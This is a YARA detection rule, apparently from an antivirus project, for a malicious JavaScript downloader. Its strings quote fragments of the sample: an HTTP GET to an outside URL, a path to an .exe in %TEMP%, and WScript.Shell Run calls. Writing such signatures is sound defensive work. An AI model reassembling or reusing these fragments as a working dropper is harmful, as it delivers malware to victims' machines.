rule sig_20160329_d4e487da130eb2c4150ecc4aa0106696 {
  meta:
    description = "datamaliciousorder - file 20160329_d4e487da130eb2c4150ecc4aa0106696.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4c691c0484bee81c142474dd69935c778e17d9961d14ebce5862804d1f5e8779"

  strings:
    $s1  = "O0[MQ](\"GET\", \"http://www.aluguerdiadema.com/p9wsld\", false);" fullword ascii
    $s2  = "function B() {return z[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8RWe6JHDRF2M.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[ep](p() * 11); if (O0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function s(IJ, p0){Mm = Mm * 1; return IJ - p0;};" fullword ascii
    $s5  = "var z = function fc() {return WScript[d](\"WScript.Shell\");}(), JD = 11;" fullword ascii
    $s6  = "function zn(){return \"\" + m;};" fullword ascii
    $s7  = "function BV() {return ((eA == true) && (eA == S)) ? 1 : Mm;};" fullword ascii
    $s8  = "function U(sY){z[\"Run\"](sY, Mm, Mm);};" fullword ascii
    $s9  = "function p(){return 22;};" fullword ascii
    $s10 = " while (dX){" fullword ascii
    $s11 = "var Z0 = new this[\"Date\"]();" fullword ascii
    $s12 = "function zQ(){return d;};" fullword ascii
    $s13 = "function Z()" fullword ascii
    $s14 = "return s(k, y);" fullword ascii
    $s15 = "function cK(pV) {var iw = (1, 2, 3, 4, 5, pV); return iw;};" fullword ascii
    $s16 = "var S = false;" fullword ascii
    $s17 = "S = true; " fullword ascii
    $s18 = "var EV = false;" fullword ascii
    $s19 = "eA = true; " fullword ascii
    $s20 = "var eA = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}